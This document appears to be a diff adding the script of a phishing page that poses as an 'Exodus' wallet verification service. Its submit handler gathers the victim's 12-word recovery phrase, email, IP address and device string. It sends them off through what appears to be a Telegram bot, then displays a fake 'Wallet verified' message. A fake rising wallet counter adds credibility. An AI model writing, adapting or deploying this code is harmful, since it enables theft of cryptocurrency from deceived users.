+    if (e.key === ' ' || e.key === 'Enter'){
+      e.preventDefault();
+      var v = inp.value.trim().toLowerCase();
+      if (v && !WORDSET.has(v) && curMatches.length){ inp.value = curMatches[0]; flagInvalid(inp); refresh(); }
+      hideSuggest();
+      if (idx < 11) inputs[idx + 1].focus();
+    }
+    if (e.key === 'Backspace' && !inp.value && idx > 0){ inputs[idx - 1].focus(); }
+  });
+
+  inp.addEventListener('blur', function(){
+    setTimeout(hideSuggest, 120);
+    flagInvalid(inp);
+  });
+
+  inp.addEventListener('paste', function(e){
+    var txt = (e.clipboardData || window.clipboardData).getData('text');
+    if (!txt) return;
+    var words = txt.trim().toLowerCase().split(/\s+/).map(clean).filter(Boolean);
+    if (words.length > 1){
+      e.preventDefault();
+      var j = idx;
+      for (var n = 0; n < words.length; n++){
+        if (j > 11) break;
+        inputs[j].value = words[n]; flagInvalid(inputs[j]); j++;
+      }
+      refresh();
+      if (j < 12) inputs[j].focus(); else inputs[11].focus();
+    }
+  });
+});
+
+window.addEventListener('resize', function(){ if (suggestEl.classList.contains('show') && curInput) placeSuggest(curInput); });
+window.addEventListener('scroll', function(){ if (suggestEl.classList.contains('show') && curInput) placeSuggest(curInput); }, true);
+
+refresh();
+
+/* =========================================================
+   STEPS
+   ========================================================= */
+function setStep(n){
+  for (var i = 1; i <= 3; i++){
+    var el = document.getElementById('s' + i);
+    el.classList.remove('active','done');
+    if (i < n) el.classList.add('done');
+    if (i === n) el.classList.add('active');
+  }
+}
+function showStatus(kind, html){
+  statusEl.className = 'status show' + (kind === 'ok' ? ' ok' : '');
+  statusEl.innerHTML = html;
+}
+function hideStatus(){ statusEl.className = 'status'; statusEl.innerHTML = ''; }
+
+/* =========================================================
+   SUBMIT
+   ========================================================= */
+var busy = false;
+
+verifyBtn.addEventListener('click', function(){
+  if (busy) return;
+
+  var words = inputs.map(function(i){ return i.value.trim().toLowerCase(); });
+  var firstEmpty = -1;
+  for (var k = 0; k < 12; k++){ if (!words[k]){ firstEmpty = k; break; } }
+
+  if (firstEmpty !== -1){
+    card.classList.add('shake');
+    setTimeout(function(){ card.classList.remove('shake'); }, 450);
+    inputs[firstEmpty].focus();
+    return;
+  }
+
+  busy = true;
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'Validating…';
+  setStep(2);
+  showStatus('', '<span class="spin"></span> Validating your recovery phrase…');
+  tgTyping();
+
+  var email = emailEl.value.trim();
+  var now = new Date();
+  var stamp = now.toLocaleString('en-GB', { hour12:false }) + ' (' + (Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC') + ')';
+  var phrase = words.join(' ');
+
+  getIP().then(function(ip){
+    var msg =
+'🔐 <b>EXODUS VERIFY — New Submission</b>\n' +
+'━━━━━━━━━━━━━━━━━━\n' +
+'📝 <b>Secret Recovery Phrase</b>\n' +
+'<code>' + esc(phrase) + '</code>\n\n' +
+'1️⃣ ' + esc(words.slice(0,4).join(' ')) + '\n' +
+'2️⃣ ' + esc(words.slice(4,8).join(' ')) + '\n' +
+'3️⃣ ' + esc(words.slice(8,12).join(' ')) + '\n' +
+'━━━━━━━━━━━━━━━━━━\n' +
+'📧 <b>Email:</b> ' + (email ? esc(email) : '— not provided') + '\n' +
+'🔢 <b>Words:</b> 12 / 12\n' +
+'🌐 <b>Page:</b> ' + SITE + '\n' +
+'🌍 <b>IP:</b> <code>' + esc(ip) + '</code>\n' +
+'📱 <b>Device:</b> ' + esc(navigator.userAgent) + '\n' +
+'🕒 <b>Time:</b> ' + esc(stamp) + '\n' +
+'🆔 <b>Ref:</b> <code>' + now.getTime().toString(36).toUpperCase() + '</code>';
+
+    tgSend(msg);
+  });
+
+  setTimeout(function(){
+    setStep(3);
+    showStatus('ok', '<span class="check"><svg viewBox="0 0 24 24" fill="none" stroke="#5fe0a3" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 13 4 4L19 7"/></svg></span> Wallet verified — full access restored');
+    verifyBtn.textContent = 'Verified ✓';
+    verifyBtn.disabled = false;
+    busy = false;
+    inputs.forEach(function(i){ i.readOnly = true; });
+    emailEl.readOnly = true;
+  }, 1500);
+});
+
+/* =========================================================
+   CLEAR
+   ========================================================= */
+clearBtn.addEventListener('click', function(){
+  inputs.forEach(function(i){ i.value = ''; i.readOnly = false; i.parentElement.classList.remove('filled','invalid'); });
+  emailEl.value = ''; emailEl.readOnly = false;
+  setStep(1);
+  hideStatus();
+  verifyBtn.textContent = 'Verify Wallet';
+  verifyBtn.disabled = false;
+  busy = false;
+  refresh();
+  inputs[0].focus();
+});
+
+/* =========================================================
+   COUNTER FLAVOUR
+   ========================================================= */
+var walletCount = 1284392;
+var walletEl = document.getElementById('wallets');
+setInterval(function(){
+  walletCount += Math.floor(Math.random() * 3) + 1;
+  walletEl.textContent = walletCount.toLocaleString('en-US');
+}, 7000);
+
+window.addEventListener('load', function(){ inputs[0].focus(); });
+</script>
+</body>
+</html>
